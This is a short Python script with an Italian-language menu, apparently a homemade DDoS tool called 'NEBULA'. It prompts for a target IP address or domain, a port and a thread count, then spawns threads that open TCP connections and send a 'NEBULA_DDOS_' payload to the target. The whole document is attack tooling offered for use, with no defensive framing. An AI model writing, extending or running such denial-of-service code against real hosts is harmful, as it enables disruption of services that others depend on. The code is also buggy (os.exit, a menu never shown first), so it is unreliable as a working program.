import os
import socket
import threading
import random

def send_packet(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        payload = f"NEBULA_DDOS_{random.randint(0, 1000000)}"
        s.send(payload.encode())
        print(f"Pacchetto inviato a {ip}:{port} con payload {payload}")
    except Exception as e:
        print(f"Errore: {e}")

def menu():
    os.system("clear")
    print("_   _ _____ ____  _   _ _        _    ")
    print(" | \\ | | ____| __ )| | | | |      / \\   ")
    print(" |  \\| |  _| |  _ \\| | | | |     / _ \\  ")
    print(" | |\\  | |___| |_) | |_| | |___ / ___ \\ ")
    print("|_| \\_|_____|____/ \___/|_____/_/   \\_\\")
    print("Inserisci un'opzione:")
    print("1. Attaccare un indirizzo IP")
    print("2. Attaccare un dominio")
    print("3. Visualizzare le opzioni avanzate")
    print("4. Uscire")

opzione = int(input("Opzione: "))

if opzione == 1:
    ip = input("Inserisci l'indirizzo IP del target: ")
    port = int(input("Inserisci la porta del target: "))
    num_threads = int(input("Inserisci il numero di thread che vuoi utilizzare: "))

    for i in range(num_threads):
        t = threading.Thread(target=send_packet, args=(ip, port))
        t.start()
elif opzione == 2:
    dominio = input("Inserisci il dominio del target: ")
    ip_dominio = socket.gethostbyname(dominio)
    port = int(input("Inserisci la porta del target: "))
    num_threads = int(input("Inserisci il numero di thread che vuoi utilizzare: "))

    for i in range(num_threads):
        t = threading.Thread(target=send_packet, args=(ip_dominio, port))
        t.start()
elif opzione == 3:
    print("Opzioni avanzate non disponibili.")
    menu()
elif opzione == 4:
    print("Arrivederci!")
    os.exit(0)
else:
    print("Opzione non valida. Torna al menu.")
    menu()
